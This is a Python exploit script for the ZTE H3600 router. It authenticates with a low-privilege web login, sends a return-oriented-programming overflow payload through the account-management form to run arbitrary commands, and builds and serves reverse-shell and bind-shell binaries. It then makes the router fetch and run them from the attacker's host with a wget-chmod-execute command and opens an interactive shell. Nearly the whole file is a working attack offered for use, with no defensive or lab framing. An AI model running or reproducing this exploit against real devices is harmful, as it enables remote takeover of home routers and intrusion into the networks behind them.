#!/usr/bin/env python3
"""
ZTE H3600 — ROP exploit (strb byte-by-byte chain, SP-independent).
User-role credential only. Default: bind shell on port 4444.

Usage:
    python3 rop_exec.py -u user -p password                    # bind shell :4444
    python3 rop_exec.py -u user -p password --bind 5555        # bind shell :5555
    python3 rop_exec.py -u user -p password --shell            # reverse shell
    python3 rop_exec.py -u user -p password --cmd "id > /tmp/x"
"""
import subprocess, time, hashlib, re, urllib.parse, base64, struct, sys, argparse
import threading, socket, os, tempfile, select

# ── ROP gadgets (httpd no-PIE, fixed addresses) ────────────────────
SYSTEM_PLT       = 0x0001a18c
POP_R3_R4_FP_PC  = 0x0001d150
MOV_R0_R4_BLX_R3 = 0x000545c8
STRB_R3_R4       = 0x0001bca8
BUF              = 0x00142000
JUNK             = struct.pack("<I", 0xdeadbeef)

# ── Payload binaries (compiled on the fly) ─────────────────────────
REVSH_SRC = """#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {AF_INET, htons(%d), {inet_addr("%s")}};
    connect(s, (struct sockaddr*)&a, sizeof(a));
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execl("/bin/sh", "sh", NULL);
}
"""

BINDSH_SRC = """#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {AF_INET, htons(%d), {htonl(INADDR_ANY)}};
    int one = 1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    bind(s, (struct sockaddr*)&a, sizeof(a));
    listen(s, 1);
    int c = accept(s, NULL, NULL);
    dup2(c, 0); dup2(c, 1); dup2(c, 2);
    execl("/bin/sh", "sh", NULL);
}
"""


def build_chain(cmd_bytes: bytes) -> bytes:
    chain = b""
    for i, b in enumerate(cmd_bytes):
        chain += struct.pack("<5I", b, BUF + i, 0xdeadbeef, STRB_R3_R4, 0xdeadbeef)
        chain += struct.pack("<I", POP_R3_R4_FP_PC)
    chain += struct.pack("<4I", SYSTEM_PLT, BUF, 0xdeadbeef, MOV_R0_R4_BLX_R3)
    return chain


def build_payload(cmd_bytes: bytes) -> bytes:
    chain = build_chain(cmd_bytes)
    return b"A" * 516 + JUNK * 6 + struct.pack("<I", POP_R3_R4_FP_PC) + chain


def login(user: str, password: str, cookies: str, target: str) -> bool:
    subprocess.run(["rm", "-f", cookies])
    subprocess.run(["touch", cookies])
    subprocess.run(
        ["curl", "-sk", "-c", cookies, "-b", cookies, f"https://{target}/", "-o", "/dev/null"],
        capture_output=True,
    )
    ts = int(time.time() * 1000)

    def _post(seed=""):
        r = subprocess.run(
            ["curl", "-sk", "-c", cookies, "-b", cookies,
             f"https://{target}/?_type=loginData&_tag=login_token&_={ts}"],
            capture_output=True, text=True,
        )
        s = re.findall(r">([0-9A-Za-z]+)<", r.stdout)
        if not s: return None
        pw = hashlib.sha256(f"{password}{s[0]}".encode()).hexdigest()
        r = subprocess.run(
            ["curl", "-sk", "-c", cookies, "-b", cookies,
             f"https://{target}/?_type=loginData&_tag=login_entry",
             "-H", "Content-Type: application/x-www-form-urlencoded",
             "--data-urlencode", f"Password={pw}",
             "--data-urlencode", f"Username={user}",
             "--data-urlencode", f"_sessionTOKEN={seed}",
             "--data-urlencode", "action=login"],
            capture_output=True, text=True,
        )
        return r.stdout

    r1 = _post("")
    seed = re.findall(r'"sess_token":"([^"]+)"', r1 or "")
    if not seed: return False
    ts = int(time.time() * 1000)
    r2 = _post(seed[0])
    return "login_need_refresh" in (r2 or "") and "true" in (r2 or "")


def get_token(cookies: str, target: str) -> str | None:
    ts = int(time.time() * 1000)
    r = subprocess.run(
        ["curl", "-sk", "-c", cookies, "-b", cookies,
         f"https://{target}/?_type=menuView&_tag=accountMgr&Menu3Location=0&_={ts}"],
        capture_output=True, text=True,
    )
    m = re.search(r'_sessionTmpToken\s*=\s*"([^"]+)"', r.stdout)
    return re.sub(r'\\x([0-9a-fA-F]{2})', lambda x: chr(int(x.group(1), 16)), m.group(1)) if m else None


def send_exploit(cmd_bytes: bytes, user: str, password: str, target: str) -> bool:
    cookies = "/tmp/rop_exec_cookies"
    if not login(user, password, cookies, target):
        print("[!] Login failed", flush=True)
        return False
    print("[+] Login OK", flush=True)
    token = get_token(cookies, target)
    if not token:
        print("[!] Token failed", flush=True)
        return False

    payload = build_payload(cmd_bytes)
    b64 = base64.b64encode(payload).decode()
    print(f"[*] Payload: {len(b64)} chars / {len(cmd_bytes)}B command", flush=True)

    body = (
        f"IF_ACTION=Apply&_InstID=IGD.AU2&Right=2&Username={user}"
        f"&Password=A&FakePasPassword=&NewPassword=A&FakePasNewPassword="
        f"&FakePasNewConfirmPassword=&Btn_cancel_AccountManag="
        f"&Btn_apply_AccountManag=&encode={urllib.parse.quote_plus(b64)}"
        f"&_sessionTOKEN={token}"
    )
    check = hashlib.sha256(body.encode()).hexdigest()
    subprocess.run(
        ["curl", "-sk", "--max-time", "30", "-c", cookies, "-b", cookies,
         f"https://{target}/?_type=menuData&_tag=devauth_accountmgr_lua.lua",
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", "X-Requested-With: XMLHttpRequest",
         "-H", f"Check: {check}",
         "--data", body, "-o", "/dev/null"],
        capture_output=True,
    )
    time.sleep(2)
    r = subprocess.run(
        ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}",
         f"https://{target}/"],
        capture_output=True, text=True,
    )
    s = r.stdout.strip()
    print(f"[+] Exploit sent (httpd={'crash' if s == '000' else s})", flush=True)
    return True


def get_attacker_ip(target: str) -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect((target, 443))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.50"


class HttpServer:
    def __init__(self, port, path):
        self.port = port
        self.path = path
        self._ok = True

    def start(self):
        path = self.path
        def _run():
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", self.port))
            s.listen(5)
            s.settimeout(1.0)
            with open(path, "rb") as f:
                data = f.read()
            while self._ok:
                try:
                    c, _ = s.accept()
                    c.recv(4096)
                    c.sendall(
                        b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n" % len(data) + data
                    )
                    c.close()
                except socket.timeout:
                    continue
                except Exception:
                    break
            s.close()
        threading.Thread(target=_run, daemon=True).start()

    def stop(self):
        self._ok = False


def compile_payload(kind, port, attacker_ip):
    fd, path = tempfile.mkstemp(suffix=".c")
    src = REVSH_SRC % (port, attacker_ip) if kind == "reverse" else BINDSH_SRC % port
    os.write(fd, src.encode())
    os.close(fd)
    out = path.replace(".c", ".bin")
    r = subprocess.run(
        ["arm-linux-gnueabi-gcc", "-static", "-o", out, path],
        capture_output=True, text=True,
    )
    os.unlink(path)
    if r.returncode != 0:
        print(f"[!] GCC error: {r.stderr}", flush=True)
        sys.exit(1)
    return out


def interact(sock):
    sock.settimeout(0.5)
    try:
        while True:
            try:
                r, _, _ = select.select([sock], [], [], 0.1)
                if r:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    sys.stdout.buffer.write(chunk)
                    sys.stdout.flush()
            except (socket.timeout, BlockingIOError):
                pass
            try:
                r, _, _ = select.select([sys.stdin], [], [], 0.1)
                if r:
                    line = sys.stdin.readline()
                    if not line: break
                    sock.sendall(line.encode())
            except (EOFError, KeyboardInterrupt):
                break
    except KeyboardInterrupt:
        pass
    print("\n[*] Shell closed.")


# ── main ───────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="ZTE H3600 ROP exploit")
    ap.add_argument("-u", "--user", required=True, help="Web login user")
    ap.add_argument("-p", "--password", required=True, help="Web login password")
    ap.add_argument("--cmd", help="Arbitrary command to execute")
    ap.add_argument("--shell", action="store_true", help="Reverse shell")
    ap.add_argument("--shell-port", type=int, default=4444, help="Reverse shell port")
    ap.add_argument("--bind", type=int, nargs="?", const=4444, metavar="PORT",
                    help="Bind shell (default 4444)")
    ap.add_argument("--attacker-ip", help="Attacker IP (auto-detected)")
    ap.add_argument("--target", default="192.168.1.1", help="Device IP")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--http-port", type=int, default=9995)
    args = ap.parse_args()

    if not args.cmd and not args.shell and args.bind is None:
        args.bind = 4444  # default to bind shell

    attacker_ip = args.attacker_ip or get_attacker_ip(args.target)

    if args.bind:
        print(f"[*] Attacker IP: {attacker_ip}", flush=True)
        print(f"[*] Compiling bind shell (port {args.bind})...", flush=True)
        binary = compile_payload("bind", args.bind, attacker_ip)
        print(f"[*] HTTP server on :{args.http_port}", flush=True)
        srv = HttpServer(args.http_port, binary)
        srv.start()
        time.sleep(0.5)
        cmd = f"wget -q http://{attacker_ip}:{args.http_port}/x -O /tmp/b; chmod 777 /tmp/b; /tmp/b"
    elif args.shell:
        print(f"[*] Attacker IP: {attacker_ip}", flush=True)
        print(f"[*] Compiling reverse shell ({attacker_ip}:{args.shell_port})...", flush=True)
        binary = compile_payload("reverse", args.shell_port, attacker_ip)
        print(f"[*] HTTP server on :{args.http_port}", flush=True)
        srv = HttpServer(args.http_port, binary)
        srv.start()
        time.sleep(0.5)
        cmd = f"wget -q http://{attacker_ip}:{args.http_port}/x -O /tmp/r; chmod 777 /tmp/r; /tmp/r"
    else:
        cmd = args.cmd
        srv = None

    cmd_bytes = cmd.encode() + b"\x00"
    if args.dry_run:
        c = build_chain(cmd_bytes)
        print(f"CMD: {cmd_bytes}\nChain: {len(c)}B  Payload: {len(build_payload(cmd_bytes))}B")
        return

    ok = send_exploit(cmd_bytes, args.user, args.password, args.target)
    if srv:
        sys.stdout.write("[*] Waiting for shell")
        sys.stdout.flush()
        deadline = time.time() + 25
        sock = None

        if args.bind:
            while time.time() < deadline and not sock:
                sys.stdout.write(".")
                sys.stdout.flush()
                try:
                    sock = socket.create_connection((args.target, args.bind), timeout=1)
                except (ConnectionRefusedError, socket.timeout, OSError):
                    pass
        else:
            ss = socket.create_server(("0.0.0.0", args.shell_port))
            ss.settimeout(1)
            try:
                while time.time() < deadline and not sock:
                    sys.stdout.write(".")
                    sys.stdout.flush()
                    try: sock, _ = ss.accept()
                    except socket.timeout: pass
            finally:
                ss.close()

        srv.stop()
        if sock:
            sys.stdout.write("\n[+] Connected!\n\n")
            sys.stdout.flush()
            interact(sock)
        else:
            sys.stdout.write("\n[!] Timeout\n")
            sys.stdout.flush()


if __name__ == "__main__":
    main()
